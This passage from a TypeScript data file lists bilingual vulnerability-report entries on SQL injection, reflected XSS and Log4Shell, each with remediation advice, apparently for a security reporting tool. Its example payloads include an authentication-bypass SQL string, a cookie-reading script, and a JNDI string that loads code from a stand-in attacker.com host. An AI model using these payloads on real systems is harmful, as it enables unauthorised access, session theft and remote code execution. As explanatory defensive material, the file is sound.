...
export const vulnerabilities: Vulnerability[] = [
  {
    ...
    affectedComponents_en: 'The login form at `/login.php` is affected. The `username` parameter is vulnerable.',
    affectedComponents_es: 'El formulario de inicio de sesión en `/login.php` está afectado. El parámetro `username` es vulnerable.',
    ...
    details_en: 'Example Payload: `\' OR 1=1; --`\nWhen this payload is submitted in the username field, the SQL query becomes `SELECT * FROM users WHERE username = \'\' OR 1=1; --\' AND password = \'...\'`, which always evaluates to true, bypassing authentication.',
    details_es: 'Payload de Ejemplo: `\' OR 1=1; --`\nCuando este payload se envía en el campo de nombre de usuario, la consulta SQL se convierte en `SELECT * FROM users WHERE username = \'\' OR 1=1; --\' AND password = \'...\'`, que siempre se evalúa como verdadera, eludiendo la autenticación.',
    remediation_en: {
  ...
  },
  {
    ...
    technicalDescription_en: 'The search functionality is vulnerable to Reflected XSS. A malicious script can be injected via the `q` query parameter. The server reflects this script back to the user\'s browser, where it is executed in the context of the user\'s session.',
    technicalDescription_es: 'La funcionalidad de búsqueda es vulnerable a XSS Reflejado. Se puede inyectar un script malicioso a través del parámetro de consulta `q`. El servidor refleja este script de vuelta al navegador del usuario, donde se ejecuta en el contexto de la sesión del usuario.',
    affectedComponents_en: 'The search page at `/search` is affected. The `q` parameter is vulnerable.',
    affectedComponents_es: 'La página de búsqueda en `/search` está afectada. El parámetro `q` es vulnerable.',
    ...
    details_en: 'Example URL: `/search?q=<script>alert(document.cookie)</script>`\nThis will cause an alert box to appear, displaying the user\'s session cookie. An attacker could replace `alert()` with a script to send the cookie to their own server.',
    details_es: 'URL de Ejemplo: `/search?q=<script>alert(document.cookie)</script>`\nEsto hará que aparezca un cuadro de alerta que muestra la cookie de sesión del usuario. Un atacante podría reemplazar `alert()` con un script para enviar la cookie a su propio servidor.',
    remediation_en: {
      shortTerm: 'Implement context-aware output encoding on the search results page.',
    ...
    remediation_es: {
      shortTerm: 'Implementar codificación de salida consciente del contexto en la página de resultados de búsqueda.',
  ...
  },
  {
    ...
    technicalDescription_en: 'The application was found to be using `log4j` version 2.14.1, which is vulnerable to the Log4Shell remote code execution vulnerability (CVE-2021-44228).',
    technicalDescription_es: 'Se descubrió que la aplicación utiliza la versión 2.14.1 de `log4j`, que es vulnerable a la vulnerabilidad de ejecución remota de código Log4Shell (CVE-2021-44228).',
    affectedComponents_en: 'The `com.example.logging.service` component which uses the `log4j` library.',
    affectedComponents_es: 'El componente `com.example.logging.service` que utiliza la librería `log4j`.',
    ...
    details_en: 'An attacker can send a crafted string like `${jndi:ldap://attacker.com/a}` to a log statement. The vulnerable log4j library will execute this, allowing the attacker to load and execute malicious code from their server.',
    details_es: 'Un atacante puede enviar una cadena maliciosa como `${jndi:ldap://attacker.com/a}` a una sentencia de log. La librería vulnerable de log4j la ejecutará, permitiendo al atacante cargar y ejecutar código malicioso desde su servidor.',
    remediation_en: {
      shortTerm: 'Immediately update the `log4j` library to version 2.17.1 or newer.',
    ...
    remediation_es: {
      shortTerm: 'Actualizar inmediatamente la librería `log4j` a la versión 2.17.1 o más reciente.',
